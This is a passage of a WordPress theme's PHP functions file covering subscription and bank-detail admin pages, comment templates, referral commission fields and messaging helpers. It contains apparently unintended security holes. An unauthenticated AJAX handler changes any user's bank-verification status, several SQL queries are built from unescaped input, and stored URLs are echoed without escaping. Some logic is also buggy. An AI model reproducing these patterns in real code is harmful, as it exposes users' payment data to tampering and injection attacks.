			$ipaddress = $_SERVER['HTTP_FORWARDED_FOR'];
		else if($_SERVER['HTTP_FORWARDED'])
			$ipaddress = $_SERVER['HTTP_FORWARDED'];
		else if($_SERVER['REMOTE_ADDR'])
			$ipaddress = $_SERVER['REMOTE_ADDR'];
		else
			$ipaddress = 'UNKNOWN';
		return $ipaddress;
}


function get_likecount($commentId){
	global $wpdb;
	$table_name = $wpdb->prefix . "commentlikecounter";
	$result = $wpdb->get_row($wpdb->prepare( "SELECT like_count,dislike_count FROM $table_name WHERE commentID = %d AND ( dislike_count = '1' OR like_count = '1' )", array($commentId ) ));
	$resultCount = $wpdb->num_rows;
	return $resultCount;
}


function get_referalusers($userId){
	global $wpdb;
	$table_name = $wpdb->prefix . "user_ref_record";
	$result = $wpdb->get_results($wpdb->prepare( "SELECT * FROM $table_name WHERE user_id = %d", array($userId)));
	$resultCount = $wpdb->num_rows;
	if($resultCount==0) return false;
	return $result;
}











// check is pu user
function is_pu_user($userId){
	$returnval= get_user_meta( $userId, 'subscription_price', true);

	 if(isset($returnval) && $returnval != ''){
	 	return true;
	 }else{
	 	return false;
	 }
}

// check is user added payment details
function is_addedpaymentinfo($userId){
	$returnval= get_user_meta( $userId, 'user_payment_details', true);

	 if(isset($returnval) && $returnval!=''){
	 	return $returnval;
	 }else{
	 	return false;
	 }
}


add_action('admin_menu', 'transaction');
/*function subscription(){
    add_menu_page('Payment Details', 'Payment Details', 'manage_options', 'my-menu', 'subscription_user_details' );
   
    add_submenu_page('my-menu', 'User Transection', 'User Transection', 'manage_options', 'transection-details','transection_user_details' );
    add_options_page( 'User Transaction', 'User Transaction', 'manage_options', 'transaction-details', 'transaction_user_details' );

   
}*/

function transaction() {
     add_menu_page(
        __( 'User Transaction', 'textdomain' ),
        __( 'User Transaction','textdomain' ),
        'manage_options',
        'transaction-details',
        'transaction_user_details',
        ''
    );
}

function transaction_user_details(){
  include "template/transaction_table.php";
}
/** Step 3. */
function subscription_user_details(){

 global $wpdb;
   $users_table = $wpdb->prefix . "usermeta";
  
   $userBankDetails = $wpdb->get_results("SELECT * FROM ".$users_table." where meta_key='user_bank_details'" );


 ?>
 <script type="text/javascript">
 	function changeStatus(userid, status){
      var ajax_url= 'https://privaposts.vn.cisinlive.com/wp-admin/admin-ajax.php';  
      $.ajax({
               type: "POST",
               url: ajax_url,
               data :{
                     'action': 'updatebank_details_status',
                     'user_id':userid,
                     'status':status,
                }, 
                success: function(response){
                	if(response=='done'){
                		 $("#succcess-message").show();
                         location.reload();
                	}
                 
                  
               }
          });
   }
 </script>
 <div class="wrap">
 <h1>User Subscription Price Details</h1>
 <div id="succcess-message" style="display: none;" class="updated notice notice-success is-dismissible"><p>Status updated successfully!</p><button type="button" class="notice-dismiss"><span class="screen-reader-text">Dismiss this notice.</span></button></div>
 <table class="wp-list-table widefat fixed striped posts">
    <thead>
        <tr>
      
            
            <th scope="col" id="author" class="manage-column column-title column-primary sortable desc"><a href="#">User</a> </th>
            <th scope="col" id="title" class="manage-column"><a href="#"><span>Subscription Price</span><span class="sorting-indicator"></span></a></th>
             <th scope="col" id="title" class="manage-column column-title column-primary sortable desc" style=""><a href="#"><span>Document</span><span class="sorting-indicator"></span></a></th>

             <th scope="col" id="title" class="manage-column column-title column-primary sortable desc" style=""><a href="#"><span>Legel Name</span><span class="sorting-indicator"></span></a></th>

            
            <th scope="col" id="author" class="manage-column column-author">Bank Country </th>
            <th scope="col" id="author" class="manage-column column-author">Staus </th>
            <th scope="col" id="author" class="manage-column column-author">Action </th>
           
         
    
           
         
        </tr>
    </thead>
    <tbody id="the-list">

        <?php 
        if(!empty($userBankDetails)){
        	$details=array();
         foreach ($userBankDetails as $value) {

         
          ?>

         
         <tr id="" class="iedit author-self level-0 post-338 type-slider status-publish has-post-thumbnail hentry category-login">
				<?php  //$details=unserialize($value->meta_value);

				$details=$value->meta_value;

				$details=unserialize(unserialize($details));

				$statusval= get_user_meta( $value->user_id, 'user_bank_details_status', true );
				$userdata=get_userdata($value->user_id);
                $userinfo=$userdata->data;
                $username=$userinfo->user_login;
				if($statusval && $statusval==1){
				 $status=0;
				 $staustxt="Active";
				}else{
				 $status=1;
				 $staustxt="Pending";
				}
				$path = explode('.',$details["document_url"]);
                $ext = end($path);
                if($ext=='pdf'){
                  $docurl="Click Here";
                }else{
                	$docurl='<img style="width: 200px; height: 100px;"src="'.$details["document_url"].'"?>';
                }
				?>

			<td class="author column-author" data-colname="Author"><?php echo $username; ?> </td>	
            <td class="author column-author" data-colname="Author">$<?php echo get_user_meta( $value->user_id, 'subscription_price', true ); ?></td>
           
            <td class="author column-author" data-colname="Author">

            <?php if($details['document_url']!=''){
              ?>
             <a href="<?php echo (isset($details['document_url']))?$details['document_url']:''; ?>" target="_blank"><?php echo $docurl;?></a>
            <?php }else{
            	echo "-";
            } ?>

            </td>
             <td class="author column-author" data-colname="Author"><?php echo (isset($details['legel_name']))?$details['legel_name']:''; ?> </td>
            
            
            <td class="categories column-categories" data-colname="Categories"><?php echo (isset($details['bank_country']))?getcountryByCode($details['bank_country']):''; ?></td> 
            <td class="categories column-categories" data-colname="Categories"><?php echo $staustxt;?> </td>
            <td><input class="button button-primary" type="button" value="Update Status" name="update_status" onclick="changeStatus(<?php echo $value->user_id;?>,<?php echo $status;?>);"></td>
        </tr>
 
        <?php  }
     

        } else{
        	?>
<tr class="iedit author-self level-0 post-338 type-slider status-publish has-post-thumbnail hentry category-login"><td class="author column-author" data-colname="Author" colspan="6"></td></tr>


        	<?php        }  ?>
        

    </tbody>
    <tfoot>
    	<th scope="col" id="title" class="manage-column column-title column-primary sortable desc" style="width: 30%"><a href="#"><span>Subscription Price</span><span class="sorting-indicator"></span></a></th>
            <th scope="col" id="author" class="manage-column column-author">Legal Name </th>
            <th scope="col" id="author" class="manage-column column-author">Document </th>
            <th scope="col" id="author" class="manage-column column-author">User </th>
            <th scope="col" id="author" class="manage-column column-author">Bank Country </th>
            <th scope="col" id="author" class="manage-column column-author">Staus </th>
            <th scope="col" id="author" class="manage-column column-author">Action </th>
    </tfoot>
</table>
</div>
 <?php }



function getcountryByCode($code=''){
 
  global $wpdb; 
	$table_name = $wpdb->prefix . "countries";
	
	if($code){
      $allcounty = $wpdb->get_row( "SELECT name FROM $table_name WHERE sortname ='$code'");
      return $allcounty->name;
	}else{
		return false;
	}  
}

/*Code for change status*/
add_action("wp_ajax_updatebank_details_status", "updatebank_details_status");
add_action("wp_ajax_nopriv_updatebank_details_status", "updatebank_details_status");

function updatebank_details_status(){

	if($_POST['user_id']!='' && $_POST['status']!=''){
		update_user_meta( $_POST['user_id'], 'user_bank_details_status', $_POST['status']);
		echo "done";
		die();
	}
}
// redirect if it is not PU
function your_function( $user_login, $user ) {
    if(!isset($_POST['ref_id'])){

    $userId = $user->ID;
    update_user_meta( $userId, 'login_status', 1 );


 		   if(is_pu_user($userId)){
 				wp_redirect(home_url()); exit();
 			}else{
 				wp_redirect(home_url('home')); exit();
 			}
    }			

}
add_action('wp_login', 'your_function', 10, 2);


add_action( 'user_register', 'myplugin_registration_save', 10, 1 );

function myplugin_registration_save( $user_id ) {

	
	if(!isset($_POST['ref_id'])){
		$userdata = get_userdata($user_id);
		wp_setcookie($userdata->user_login, $userdata->user_pass, true);
		UM()->Followers_API()->api()->add( 1, $user_id ); // Default follow to admin
		wp_redirect(home_url('/become-creator/')); 
		exit();
	}	
}

function mytheme_comment($comment, $args, $depth) {
   $GLOBALS['comment'] = $comment; ?>
   <li <?php comment_class(); ?> id="li-comment-<?php comment_ID() ?>">
     <div id="comment-<?php comment_ID(); ?>">
      <div class="comment-author vcard">
         <?php echo get_avatar($comment,$size='48',$default='<path_to_url>' ); ?>

         <?php printf(__('<cite class="fn">%s</cite> <span class="says">says:</span>'), get_comment_author_link()) ?>
      </div>
      <?php if ($comment->comment_approved == '0') : ?>
         <em><?php _e('Your comment is awaiting moderation.') ?></em>
         <br />
      <?php endif; ?>

      <div class="comment-meta commentmetadata"><a href="<?php echo htmlspecialchars( get_comment_link( $comment->comment_ID ) ) ?>"><?php printf(__('%1$s at %2$s'), get_comment_date(),  get_comment_time()) ?></a><?php edit_comment_link(__('(Edit)'),'  ','') ?></div>

      <?php comment_text() ?>

      <div class="reply">
         <?php comment_reply_link(array_merge( $args, array('depth' => $depth, 'max_depth' => $args['max_depth']))) ?>
      </div>
     </div>
<?php
        }



function twentysixteen_comment($comment, $args, $depth) {
   $GLOBALS['comment'] = $comment; ?>
   <li <?php comment_class(); ?> id="li-comment-<?php comment_ID() ?>">
     <div id="comment-<?php comment_ID(); ?>">
      <div class="comment-author vcard">
         <?php echo get_avatar($comment,$size='48',$default='<path_to_url>' ); ?>

         <?php printf(__('<cite class="fn">%s</cite> <span class="says">says 1:</span>'), get_comment_author_link()) ?>
      </div>
      <?php if ($comment->comment_approved == '0') : ?>
         <em><?php _e('Your comment is awaiting moderation.') ?></em>
         <br />
      <?php endif; ?>

      <div class="comment-meta commentmetadata"><a href="<?php echo htmlspecialchars( get_comment_link( $comment->comment_ID ) ) ?>"><?php printf(__('%1$s at %2$s'), get_comment_date(),  get_comment_time()) ?></a><?php edit_comment_link(__('(Edit)'),'  ','') ?></div>

      <?php comment_text() ?>

      <div class="reply">
         <?php comment_reply_link(array_merge( $args, array('depth' => $depth, 'max_depth' => $args['max_depth']))) ?>
      </div>
     </div>
<?php
        }


function addCommentReplyForm($comment, $args, $depth){
  
  if ( 'div' === $args['style'] ) {
        $tag       = 'div';
        $add_below = 'comment';
    } else {
        $tag       = 'li';
        $add_below = 'div-comment';
    }?>
    <<?php echo $tag; ?> <?php comment_class( empty( $args['has_children'] ) ? '' : 'parent' ); ?> id="comment-<?php comment_ID() ?>"><?php 
    if ( 'div' != $args['style'] ) { ?>
        <div id="div-comment-<?php comment_ID() ?>" class="cmnt-view"><?php
    } ?>

    <?php 
    $authorid =  get_comment(get_comment_ID());

    $authorid = $authorid->user_id; 
    $user_info = get_userdata($authorid);
    $url     = home_url().'/'.$user_info->data->user_login; 
    
    /*
        <div class="cmt-usr-rply"><?php 
            if ( $args['avatar_size'] != 0 ) {
                echo get_avatar( $comment, $args['avatar_size'] ); 
            } 
            printf( __( '<cite class="fn">%s</cite>' ), get_comment_author_link() ); ?>
        </div><div class="cmt-rply-txt"><?php comment_text(); ?></div>
	
   */?>
<style type="text/css">h3#reply-title{ display: none; }</style>
<div class="cmnt-thread">
                <div class="cmt-usr-img-lft">
                    <?php 
            if ( $args['avatar_size'] != 0 ) {
                echo get_avatar( $comment, $args['avatar_size'] ); 
            }  ?>
                </div>
                <div class="cmt-usr-rgt">
                    <div class="cmt-usr-rply">
                        <div class="cmt-usr-nme"><span><?php printf( __( '<cite class="fn"><a href="'.$url.'">%s</a></cite>' ), $user_info->data->user_login ); ?></span></div>
                        <div class="cmt-rply-txt"><?php comment_text(); ?></div>
                    </div>
                    <div class="time-reply">
                        <span class="cmt-time"><?php //echo get_comment_date();  
                    echo   timeAgo(get_comment_date().get_comment_time());?></span>
                        <!-- <span class="rpl-lnk"><strong>Reply</strong></span> -->
                        

                        <span class="time-reply">
                        	<?php 
                comment_reply_link( 
                    array_merge( 
                        $args, 
                        array( 
                            'add_below' => $add_below, 
                            'depth'     => $depth, 
                            'max_depth' => $args['max_depth'] 
                        ) 
                    ) 
                ); ?>

                <?php echo 'd-'.edit_comment_link( __( 'Edit Comment', 'textdomain' ), '<p>', '</p>' ); ?>
        </span>

                    </div>
                    <div class="like-btn">
                    	<?php $cmnntcont =  get_likecount(get_comment_ID());
                    		$class = ($cmnntcont==0)?'fa fa-heart-o':'fa fa-heart';
                    	 ?>
                    	<a class="ad-fav simpleAjaxLike_comment" data-option="like" data-check="1" data-id="<?php echo comment_ID(); ?>">
                    	    <i class="<?php echo $class; ?>"></i><?php if($cmnntcont !=0) echo $cmnntcont; ?>
                    	</a>
                    </div>
                </div>
            </div>


        <?php 
        if ( $comment->comment_approved == '0' ) { ?>
            <em class="comment-awaiting-moderation"><?php _e( 'Your comment is awaiting moderation.' ); ?></em><br/><?php 
        } ?>
        

        <div class="comment-meta commentmetadata">
            <a href="<?php echo htmlspecialchars( get_comment_link( $comment->comment_ID ) ); ?>"><?php
                /* translators: 1: date, 2: time */
                /*printf( 
                    __('%1$s at %2$s'), 
                    get_comment_date(),  
                    get_comment_time() 
                );*/ ?>
            </a>

        </div>

        

        <?php 
    if ( 'div' != $args['style'] ) : ?>
        </div><?php 
    endif;
	
}



/*function user_last_login( $user_login, $user ) {
	
	$current_user = wp_get_current_user();
	print_r($current_user);die('done');
    update_user_meta( $current_user->ID, 'login_status', 1 );
}
add_action( 'wp_login', 'user_last_login', 10, 2 );
*/
function logout_redirect765(){
  $current_user = wp_get_current_user();
  update_user_meta( $current_user->ID, 'login_status', 0 );
}
add_action('wp_logout','logout_redirect765');
// do payment stripe





/**
 * get cover uri
 *
 * @param $image
 * @param $attrs
 *
 * @return bool|string
 */
function um_get_cover_uri_id( $image, $attrs ) {
	
	$uri = false;
	$ext = '.' . pathinfo( $image, PATHINFO_EXTENSION );
	if (file_exists( UM()->files()->upload_basedir . um_profile_id() . "/cover_photo{$ext}" ) ) {
		$uri = um_user_uploads_uri() . "/cover_photo{$ext}?" . current_time( 'timestamp' );
	}
	
	if ( file_exists( UM()->files()->upload_basedir . um_profile_id() . "/cover_photo-{$attrs}x{$attrs}{$ext}" ) ) {
		$uri = um_user_uploads_uri() . "/cover_photo-{$attrs}x{$attrs}{$ext}?". current_time( 'timestamp' );
	}else if ( file_exists( UM()->files()->upload_basedir . um_profile_id() . "/cover_photo-{$attrs}{$ext}" ) ) {
		$uri = um_user_uploads_uri() . "/cover_photo-{$attrs}{$ext}?" . current_time( 'timestamp' );
	}
	return $uri;
}

/*code to conver id encrypt/decrypt form*/

function numhash($n) {
    return (((0x0000FFFF & $n) << 16) + ((0xFFFF0000 & $n) >> 16));
}

add_action( 'show_user_profile', 'crf_show_extra_profile_fields' );
add_action( 'edit_user_profile', 'crf_show_extra_profile_fields' );

function crf_show_extra_profile_fields( $user ) {
	$year = get_the_author_meta( 'referral_percent', $user->ID );
	?>
	<h3><?php esc_html_e( 'Referral (%)', 'crf' ); ?></h3>

	<table class="form-table">
		<tr>
			<th><label for="referral"><?php esc_html_e( 'Referral (%)', 'crf' ); ?></label></th>
			<td>
				<input type="number"
			       min="1900"
			       max="2017"
			       step="1"
			       id="referral_percent"
			       name="referral_percent"
			       value="<?php echo esc_attr( $referral_percent ); ?>"
			       class="regular-text"
				/>
			</td>
		</tr>
		<tr>
			<th><label for="referral"><?php esc_html_e( 'Comission Rates (%)', 'crf' ); ?></label></th>
			<td>
				<fieldset><p><label style="padding-right: 6px;">PU commission rate</label><label><input type="number"
			       min="1900"
			       max="2017"
			       step="1"
			       id="PU_commissionrate"
			       name="PU_commissionrate"
			       value="<?php echo esc_attr( $PU_commissionrate ); ?>"
			       class="regular-text"
				/></label></p></fieldset>
				<fieldset><p><label style="padding-right: 6px;">RU commission rate</label><label><input type="number"
			       min="1900"
			       max="2017"
			       step="1"
			       id="RU_commissionrate"
			       name="RU_commissionrate"
			       value="<?php echo esc_attr( $RU_commissionrate ); ?>"
			       class="regular-text"
				/></label></p></fieldset>
				<fieldset><p><label style="padding-right: 6px;">RU override commission rate</label><label><input type="number"
			       min="1900"
			       max="2017"
			       step="1"
			       id="RU_override_commissionrate"
			       name="RU_override_commissionrate"
			       value="<?php echo esc_attr( $RU_override_commissionrate ); ?>"
			       class="regular-text"
				/></label></p></fieldset>
				<fieldset><p><label style="padding-right: 6px;">Bypassing the subscription payment process</label><label>
				<input type="checkbox" id="bypass_subscription_payment_process" name="bypass_subscription_payment_process" value="" <?php if (esc_attr( $bypass_subscription_payment_process) == "1") echo "checked"; ?> class="regular-text"/>
				</label></p></fieldset>
			</td>
		</tr>
	</table>
	<?php
}

add_action( 'personal_options_update', 'crf_update_profile_fields' );
add_action( 'edit_user_profile_update', 'crf_update_profile_fields' );

function crf_update_profile_fields( $user_id ) {
	if ( ! current_user_can( 'edit_user', $user_id ) ) {
		return false;
	}

	if ( ! empty( $_POST['referral_percent'] ) && intval( $_POST['referral_percent'] ) >= 1900 ) {
		update_user_meta( $user_id, 'referral_percent', intval( $_POST['referral_percent'] ) );
	}
	if ( ! empty( $_POST['PU_commissionrate'] ) && intval( $_POST['PU_commissionrate'] ) >= 1900 ) {
		update_user_meta( $user_id, 'PU_commissionrate', intval( $_POST['PU_commissionrate'] ) );
	}
	if ( ! empty( $_POST['RU_commissionrate'] ) && intval( $_POST['RU_commissionrate'] ) >= 1900 ) {
		update_user_meta( $user_id, 'RU_commissionrate', intval( $_POST['RU_commissionrate'] ) );
	}
	if ( ! empty( $_POST['RU_override_commissionrate'] ) && intval( $_POST['RU_override_commissionrate'] ) >= 1900 ) {
		update_user_meta( $user_id, 'RU_commissionrate', intval( $_POST['RU_override_commissionrate'] ) );
	}
	if ( ! empty( $_POST['bypass_subscription_payment_process'] ) && intval( $_POST['bypass_subscription_payment_process'] ) >= 1900 ) {
		update_user_meta( $user_id, 'bypass_subscription_payment_process', intval( $_POST['bypass_subscription_payment_process'] ) );
	}
}




function pippin_errors(){
    static $wp_error; // Will hold global variable safely
    return isset($wp_error) ? $wp_error : ($wp_error = new WP_Error(null, null, null));
}





/*function custom_rewrite_tag() {
  add_rewrite_tag('%profile%', '([^&]+)');
  
}
add_action('init', 'custom_rewrite_tag', 10, 0);

function custom_rewrite_rule() {
   add_rewrite_rule('^fund-details/([^/]*)/?','index.php?page_id=18&profile=$matches[1]','top');
 }
add_action('init', 'custom_rewrite_rule', 10, 0);*/
// get count of video and images by user Id
function get_videoimagecount($user_id){
	
	$photos = 0;
	$videos = 0;

	$args = array(
  			'author'        =>  $user_id, 
  			'orderby'       =>  'post_date',
  			'order'         =>  'ASC',
  			'posts_per_page' => -1, // no limit
  	     	'meta_query' => array(
			      array(
         					'key'     => 'post_image',
         					'value'   => '',
         					'compare' => '!='
      					)
   					)
			);

$current_user_posts = get_posts( $args );
foreach ($current_user_posts as $key => $value) {
		$post_image = get_post_meta( $value->ID, 'post_image', true );
		foreach ($post_image as $index => $img) {
			$path      = parse_url($img, PHP_URL_PATH);       // get path from url
			$extension = pathinfo($path, PATHINFO_EXTENSION); // get ext from path
			$video_extsion = array("mp4","webm","3gp","mov");
			if(in_array($extension, $video_extsion)){
				$videos++;
			}else{
				$photos++;
			}
		}
}


	$record['photos'] =$photos;
	$record['videos'] =$videos;
	return $record;
}

function getlastmessage($senderid){
	global $wpdb;
	global $current_user; 
	$id=$current_user->ID;
	$conversations = $wpdb->get_row(' 
	SELECT content,time as tm FROM '.$wpdb->prefix.'um_messages where recipient = '.$id.' && author = '.$senderid.' ORDER BY message_id DESC LIMIT 1');
	if(!empty($conversations)){
		return $conversations;
	}else{
		return '';
	}
}


function insertMessage($author =2, $recipient=19, $msg='reree'){

    global $wpdb;
	

	if($author !='' && $recipient!='' && $msg !=''){
	    $getResult = $wpdb->get_row(' SELECT conversation_id FROM '.$wpdb->prefix.'um_conversations AS cn where (cn.user_a ='.$author.' AND cn.user_b= '.$recipient.') OR ( cn.user_b ='.$author.' AND cn.user_a= '.$recipient.')');

	    if(!empty($getResult) && $getResult){
	      $wpdb->insert(
				$wpdb->prefix.'um_messages',
				array(
					'conversation_id' => $getResult->conversation_id,
					'time' => current_time( 'mysql' ),
					'content' => strip_tags( $msg ),
					'status' => 0,
					'author' => $author,
					'recipient' => $recipient
				)
			);
	    }else{

	        $wpdb->insert(
					$wpdb->prefix.'um_conversations',
					array(
						'user_a' => $author,
						'user_b' => $recipient
					)
				);
			$conversation_id = $wpdb->insert_id;
			$wpdb->insert(
				$wpdb->prefix.'um_messages',
				array(
					'conversation_id' => $conversation_id,
					'time' => current_time( 'mysql' ),
					'content' => strip_tags( $msg ),
					'status' => 0,
					'author' => $author,
					'recipient' => $recipient
				)
			);
	    }//end else 
    }//check empty
}//end function

function custom_admin_js() {
    $url = get_bloginfo('template_directory') . '/assets/js/wp-admin.js';
    echo '"<script type="text/javascript" src="'. $url . '"></script>"
    		';
}
add_action('admin_footer', 'custom_admin_js');


 